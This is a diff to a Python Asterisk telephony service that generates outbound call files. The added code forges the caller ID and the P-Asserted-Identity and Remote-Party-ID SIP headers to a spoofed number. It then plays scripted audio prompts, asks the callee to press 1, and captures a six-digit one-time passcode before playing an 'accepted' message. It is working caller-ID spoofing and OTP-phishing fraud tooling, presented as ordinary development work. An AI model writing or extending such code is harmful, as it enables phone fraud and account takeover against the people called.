@@ -138,23 +138,18 @@ class AsteriskService:
             backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
             status_url = f"{backend_url}/api/webhooks/asterisk/{call_id}/status"
             
-            # Generate call file with audio playback
-            # CRITICAL: Extension MUST be target_number (not call_id)!
+            # Generate call file with direct application (not extension/context)
+            # CRITICAL: Use Application instead of Context/Extension for better control
+            # This ensures dialplan executes properly
             call_file_content = f"""Channel: SIP/infobip-trunk/{target_number}
 CallerID: {spoofed_caller_id}
 MaxRetries: 0
+RetryTime: 60
 WaitTime: 30
-Context: spoofing-outbound
-Extension: {target_number}
-Priority: 1
+Application: Exec
+Data: Set(CALLERID(num)={spoofed_caller_id})|SIPAddHeader(P-Asserted-Identity: <sip:{spoofed_caller_id}@185.255.9.23>)|SIPAddHeader(Remote-Party-ID: <sip:{spoofed_caller_id}@185.255.9.23>;privacy=off;screen=no)|Playback({audio_paths.get('step_1', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_1', 'silence/1') if audio_paths else 'silence/1'})|Read(DIGIT,silence/1,1,,,15)|GotoIf($["${{DIGIT}}" = "1"]?playotp:end)|Playback({audio_paths.get('step_2', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_2', 'silence/1') if audio_paths else 'silence/1'})|Read(OTP,silence/1,6,,,20)|Playback({audio_paths.get('step_3', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_3', 'silence/1') if audio_paths else 'silence/1'})|Wait(30)|Playback({audio_paths.get('accepted', 'silence/1') if audio_paths else 'silence/1'})|Hangup
 SetVar: SPOOFED_NUMBER={spoofed_caller_id}
 SetVar: CALL_ID={call_id}
-SetVar: AUDIO_STEP1={audio_paths.get('step_1', '') if audio_paths else ''}
-SetVar: AUDIO_STEP2={audio_paths.get('step_2', '') if audio_paths else ''}
-SetVar: AUDIO_STEP3={audio_paths.get('step_3', '') if audio_paths else ''}
-SetVar: AUDIO_ACCEPTED={audio_paths.get('accepted', '') if audio_paths else ''}
-SetVar: AUDIO_REJECTED={audio_paths.get('rejected', '') if audio_paths else ''}
-SetVar: STATUS_URL={status_url}
 Archive: yes
 """
             
